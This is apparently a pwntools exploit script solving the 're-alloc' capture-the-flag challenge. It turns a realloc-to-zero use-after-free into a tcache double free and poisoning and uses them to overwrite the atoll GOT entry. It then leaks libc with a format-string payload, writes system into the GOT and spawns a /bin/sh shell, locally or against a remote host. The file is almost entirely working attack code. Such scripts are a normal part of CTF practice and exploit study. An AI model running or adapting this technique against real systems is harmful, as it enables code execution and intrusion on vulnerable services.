#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('re-alloc_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
dir /home/mark/Desktop/Lab/PwnableTW/realloc/src
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def alloc(idx, size, data):
    io.sendlineafter(b"choice:", b"1")
    io.sendlineafter(b"Index:", str(idx).encode())
    io.sendlineafter(b"Size:", str(size).encode())
    io.sendafter(b"Data:", data)


def realloc(idx, size, data):
    io.sendlineafter(b"choice:", b"2")
    io.sendlineafter(b"Index:", str(idx).encode())
    io.sendlineafter(b"Size:", str(size).encode())
    io.sendafter(b"Data:", data)

def realloc_free(idx):
    io.sendlineafter(b"choice:", b"2")
    io.sendlineafter(b"Index:", str(idx).encode())
    io.sendlineafter(b"Size:", b"0")


def free(idx):
    io.sendlineafter(b"choice:", b"3")
    io.sendlineafter(b"Index:", str(idx).encode())


def solve():

    """
    Get a UAF from calling realloc(mem, 0) then tcachedup
    """

    alloc(0, 0x20, b"A"*8)
    realloc_free(0)
    realloc(0, 0x20, b"B"*9)
    free(0)

    alloc(0, 0x20, p64(exe.got["atoll"]))
    alloc(1, 0x20, b"junk")

    """
    Clear heap[0] & heap[1] by reallocating it (changing it's size) then free
    """

    realloc(0, 0x40, b"C"*8)
    free(0)
    realloc(1, 0x50, b"C"*8)
    free(1)

    """
    Stage two tcache poisoning 
    """

    alloc(0, 0x30, b"A"*8)
    realloc_free(0)
    realloc(0, 0x30, b"B"*9)
    free(0)

    alloc(0, 0x30, p64(exe.got["atoll"]))
    alloc(1, 0x30, b"junk")

    realloc(0, 0x60, b"C"*8)
    free(0)
    realloc(1, 0x70, b"C"*8)
    free(1)


    """
    Tcache poisoning -> Got overwrite
    """

    alloc(0, 0x20, p64(exe.plt["printf"]))

    io.sendlineafter(b"choice:", b"3")
    io.sendlineafter(b"Index:", b"%7$p")
    stdout = int(io.recvline().strip(b"\n"), 16)
    libc.address = stdout - libc.sym["_IO_2_1_stdout_"]
    info("libc base: %#x", libc.address)

    io.sendlineafter(b"choice:", b"1")
    io.sendafter(b"Index:", b"\x01")
    io.sendlineafter(b"Size:", b"%47c")
    io.sendlineafter(b"Data:", p64(libc.sym["system"]))

    io.sendlineafter(b"choice:", b"3")
    io.sendlineafter(b"Index:", b"/bin/sh\x00")


    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

